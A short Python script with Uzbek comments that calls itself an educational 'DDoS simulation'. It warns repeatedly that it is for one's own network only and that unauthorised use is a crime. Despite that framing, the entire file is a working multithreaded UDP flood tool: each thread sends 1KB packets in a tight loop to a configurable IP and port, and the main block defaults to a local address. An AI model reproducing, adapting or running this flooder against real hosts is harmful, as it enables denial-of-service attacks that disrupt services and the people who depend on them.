#!/usr/bin/env python3
"""
DDoS Simulyatsiya - FAQAT TA'LM UCHUN!
Faqat o'z tarmog'ingizda sinang!
Ruxsatsiz ishlatish JINOYAT!
"""

import socket
import threading
import time

def flood_worker(target_ip, target_port, duration=10):
    """
    UDP paketlar yuborish worker
    
    ⚠️  FAQAT O'Z TARMOG'INGIZDA SINANG!
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b"X" * 1024  # 1KB payload
    end_time = time.time() + duration
    sent = 0
    
    while time.time() < end_time:
        try:
            sock.sendto(data, (target_ip, target_port))
            sent += 1
        except:
            break
    
    sock.close()
    return sent

def ddos_simulation(target_ip, target_port, num_threads=10, duration=5):
    """
    DDoS simulyatsiya - ko'p thread bilan
    
    ⚠️  FAQAT O'Z TARMOG'INGIZDA SINANG!
    """
    print(f"⚠️  DDoS Simulyatsiya: {target_ip}:{target_port}")
    print(f"[*] {num_threads} thread, {duration} soniya")
    print("⚠️  CTRL+C to'xtatish uchun\n")
    
    threads = []
    start_time = time.time()
    
    for i in range(num_threads):
        t = threading.Thread(
            target=flood_worker,
            args=(target_ip, target_port, duration)
        )
        t.start()
        threads.append(t)
        time.sleep(0.1)
    
    for t in threads:
        t.join()
    
    elapsed = time.time() - start_time
    print(f"\n[*] Tugadi: {elapsed:.1f} soniya")

if __name__ == "__main__":
    # ⚠️  FAQAT O'Z TARMOG'INGIZNI ISHLATING!
    TARGET = "192.168.1.100"  # Target server IP
    PORT = 8080               # Port
    THREADS = 5               # Thread soni
    DURATION = 5              # Davomiylik (soniya)
    
    ddos_simulation(TARGET, PORT, THREADS, DURATION)
